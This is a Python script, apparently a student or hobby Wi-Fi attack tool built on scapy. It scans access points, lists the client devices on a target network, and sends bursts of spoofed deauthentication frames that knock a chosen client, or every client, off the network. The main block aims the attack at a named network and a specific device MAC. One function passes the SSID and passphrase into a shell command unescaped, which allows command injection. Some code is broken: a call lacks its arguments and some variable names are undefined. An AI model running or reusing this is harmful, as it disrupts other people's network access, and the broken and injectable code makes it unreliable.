import os
import sys
import logging


logging.basicConfig(filename=os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'log', 'sniff.log'),
                    level=logging.DEBUG,
                    format='%(asctime)s [%(levelname)s]%(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S')

sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'scapy'))
from scapy.all import *  # noqa: E402


class Network:
    def __init__(self, ssid: str, bssid: str, channel: int, crypto: set[str], gateway: str = None, subnet: int = None):
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel
        self.crypto = crypto
        self.gateway = gateway
        self.subnet = subnet

    def __str__(self):
        return ('[Network info] ssid:{}  bssid:{}  channel:{}  crypto:{}  gateway:{}  subnet:{}'
                .format(self.ssid, self.bssid, self.channel, self.crypto, self.gateway, self.subnet))


class Host:
    def __init__(self, bssid: str, MAC: str, IP: str):
        self.bssid = bssid
        self.MAC = MAC
        self.IP = IP

    def __str__(self):
        return ('[Host info] bssid:{}  MAC:{}  IP:{}'
                .format(self.bssid, self.MAC, self.IP))


# Recognizes and returns a list of network interface.
#   [Input] none
#   [Output] List of available network interface [Name, Description, MAC, IPv4]
def lookup_iface() -> list[NetworkInterface]:
    iface_list = []
    for guid, iface in conf.ifaces.data.items():
        if iface.mac != '':  # Windows에서 WAN Miniport 제외
            iface_list.append(iface)
    return iface_list


def connect_to_wifi(ssid, passphrase):
    command = f'netsh wlan connect ssid="{ssid}" name="{ssid}" key="{passphrase}" interface="Wi-Fi"'
    subprocess.run(command, shell=True)

# Send de-authentication frame to force disconnect a specific client or all clients connected to the target network
#   [Input] Network, Target Client MAC address, Broadcast or not, Network interface to use
#   [Output] None
def disconnect_client(network: Network, client_MAC: str = '', broadcast: bool = False, iface=conf.iface):
    if broadcast:
        client_MAC = 'ff:ff:ff:ff:ff:ff'
    deauth_packet = (RadioTap()
                     / Dot11(addr1=client_MAC, addr2=network.bssid, addr3=network.bssid)
                     / Dot11Deauth(reason=7))
    iface.setmonitor(True)
    set_channel(network.channel, iface)
    sendp(deauth_packet, iface=iface, monitor=True, count=100, inter=0.1)
    iface.setmonitor(False)


# Change the channel of the target network interface. (Only works in monitor mode.)
#   [Input] Channel number, Target interface
#   [Output] Success or failure
def set_channel(num: int, iface=conf.iface) -> bool:
    if not iface.ismonitor():
        print("Cannot change channel. First you need to switch your iface to monitor mode.")
        return False
    else:
        iface.setchannel(num)
        return True  # But it's still possible that it failed... (responsibility of scapy)


# Scan access points while switching channels in the 2.4GHz and 5GHz bands.
#   [Input] Channel list for scanning, Frequency('2.4ghz' or '5ghz'), Passive/Active scan, Network interface to use
#   [Output] List of connectable networks (ssid, bssid, channel, crypto)
def scan_AP(channels: list[int] = None, frequency: str = None, active: bool = False, iface=conf.iface) -> list[Network]:
    wifi_2_4_channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
    wifi_5_channels = [36, 40, 44, 48, 149, 153, 157, 161]  # in KOREA
    network_list = []
    current_channel = 0

    # Callback function that executes with each packet sniffed.
    def handle_scan_AP(packet):
        try:
            # Passive Scan
            if packet.haslayer(Dot11Beacon):  # Beacon Frame
                netstats = packet[Dot11Beacon].network_stats()
                if ('channel' in netstats and netstats[
                    'channel'] == current_channel  # Discard frames from other channels
                        and packet.addr3 not in [network.bssid for network in network_list]):
                    network_list.append(Network(
                        netstats['ssid'],
                        packet.addr3,
                        netstats['channel'],
                        netstats['crypto']
                    ))
                    print(network_list[-1])
            '''
            if active:  # Active Scan
                if packet.type == 0 and (packet.subtype == 4 or packet.subtype == 5):    # Probe Request/Response Frame
                    ...
                    print('Sorry, active scanning is currently not supported.')
            '''
        except (KeyError, TypeError) as e:  # Probably a malformed packet
            ...

    if channels is None:
        if frequency is None:
            channels = wifi_2_4_channels + wifi_5_channels
        elif frequency.lower() == '2.4ghz':
            channels = wifi_2_4_channels
        elif frequency.lower() == '5ghz':
            channels = wifi_5_channels

    print('Start passive scan')

    iface.setmonitor(True)
    for n in channels:
        # Sequential channel switching - Stays for 1 second on each channel
        current_channel = n
        print('Current channel: %d' % n)
        set_channel(n, iface)
        # 비콘 프레임은 보통 100ms마다 송신되기 때문에 timeout=0.1~0.2여도 충분할 것 같다.
        sniff(iface=iface, monitor=True, timeout=0.5, prn=handle_scan_AP, store=0)
    iface.setmonitor(False)
    return network_list


# Scan client devices connected to a specific network.
#   [Input] Target network, Network interface to use
#   [Output] Information list of client devices ( )
def scan_host(network: Network, iface=conf.iface) -> list[Host]:
    host_list = _scan_host_MAC(network, iface)
    host_list = _scan_host_IP(host_list, network, iface)
    return host_list


# Scan MAC addresses of client devices
def _scan_host_MAC(network: Network, iface=conf.iface) -> list[dict]:
    host_list = []

    # Callback function that executes with each packet sniffed.
    def handle_scan_host_MAC(packet):
        try:
            if packet.haslayer(Dot11):
                if (packet.type == 0 and packet.subtype == 4  # Probe Request Frame (Occurs only on new connection)
                        and packet.addr3 == network.bssid):
                    if packet.addr2 not in [host.MAC for host in host_list]:
                        host_list.append(Host(network.bssid, packet.addr2, ''))
                        print(host_list[-1])
                elif (packet.type == 2  # Data Frame
                      and packet.addr1 == network.bssid):  # Client -> AP (To DS=1, From DS=0)
                    if packet.addr2 not in [host.MAC for host in host_list]:
                        host_list.append(Host(network.bssid, packet.addr2, ''))
                        print(host_list[-1])
        except (KeyError, TypeError) as e:  # Probably a malformed packet
            ...

    iface.setmonitor(True)
    set_channel(network.channel, iface)
    sniff(iface=iface, monitor=True, timeout=10, prn=handle_scan_host_MAC, store=0)
    iface.setmonitor(False)
    return host_list


# Scan IP addresses of client devices
def _scan_host_IP(host_list: list[Host], network: Network, iface=conf.iface) -> list[dict]:
    _find_MAC_from_IP(host_list, network, iface)

    return host_list


# SScan IP with ARP Request/Response within subnet range
def _find_MAC_from_IP(host_list: list[Host], network: Network, iface=conf.iface):
    connect_to_wifi()

    ARP_request = (Ether(dst='ff:ff:ff:ff:ff:ff', src=iface.mac, type='ARP')
                   / ARP(hwsrc=iface.mac, psrc=iface.ip, pdst='{}/{}'.format(gateway, subnet))[0])
    answered_list = srp(ARP_request, iface=iface, timeout=10)[0]
    for sent, received in answered_list:  # ARP Response
        appended = False
        for host in host_list:
            if received.hwsrc == host.MAC:
                host.IP = received.psrc
                appended = True
        if not appended:
            host_list.append(Host(network.bssid, received.hwsrc, received.psrc))

        print('{} - {}'.format(received.hwsrc, received.psrc))
    return host_list


if __name__ == '__main__':
    iface_list = lookup_iface()
    iface = next((i for i in iface_list if i.description == '802.11n USB Wireless LAN Card'), None)
    # network = Network('monodoo2.4', '58:86:94:a0:b4:68', 3, {'WPA2/PSK'}, '192.168.0.1', 24)
    network = Network('cse-410', '58:86:94:56:0f:76', 1, {'WPA2/PSK'}, '192.168.0.1', 24)
    '''
    network_list = scan_AP(frequency='2.4ghz', iface=iface)
    network = next((network for network in network_list if network.ssid == 'cse-410'), None)
    if network.gateway is None:
        network.gateway = '192.168.0.1'
    if network.subnet is None:
        network.subnet = 24
    '''
    scan_host(network=network, iface=iface)
    disconnect_client(network=network, client_MAC='04:29:2e:79:4a:12', iface=iface)
